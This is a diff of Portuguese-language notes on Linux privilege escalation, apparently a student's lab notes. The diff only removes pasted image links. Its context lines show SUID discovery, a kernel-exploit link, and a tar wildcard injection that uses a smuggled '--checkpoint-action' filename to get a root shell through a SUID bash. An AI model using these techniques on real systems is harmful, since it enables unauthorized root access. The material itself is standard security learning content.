@@ -41,8 +41,6 @@ ___
 - `cat /proc/version` -> `Linux version 2.6.32-5-amd64 (Debian 2.6.32-48squeeze6) (jmm@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 SMP Tue May 13 16:34:35 UTC 2014`
 - `cat /etc/issue` -> `Debian GNU/Linux 6.0 \n \l`
 - `lscpu` -> Vale a pena olhar, porque alguns xpls só funcionam com um número especifico de threads
-
-![[Pasted image 20230129153636.png]]
 - `ps aux` -> Serviços. É importante olhar, pra entender qual usuário está rodando qual serviço.
 
 
@@ -123,8 +121,6 @@ ___
 # Kernel Exploits
 
 [Kernel Exploits](https://github.com/lucyoa/kernel-exploits)
-
-![[Pasted image 20230202152827.png]]
 
 `uname -a`
 
@@ -710,8 +706,6 @@ export -f /usr/sbin/service
 
 ### Exploração 3
 
-![[Pasted image 20230204181521.png]]
-![[Pasted image 20230204181533.png]]
 
 ```
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
@@ -876,7 +870,6 @@ touch /home/user/--checkpoint-action=exec=sh\ runme.sh
 /tmp/bash -p
 ```
 
-![[Pasted image 20230201114235.png]]
 
 - O que aconteceu foi que, como ele executa tudo com wildcard no folder, ele executará como root `tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh\ runme.sh` e chamará o script que modifica o SUID do bash colocado no temp.
 - Também é possível criar uma revshell com msfvenom, transferir para a máquina alvo e criar o checkpoint action com `--checkpoint-action=exec=shell.elf`. Na máquina atacante, precisará de um listener para receber a configuração.
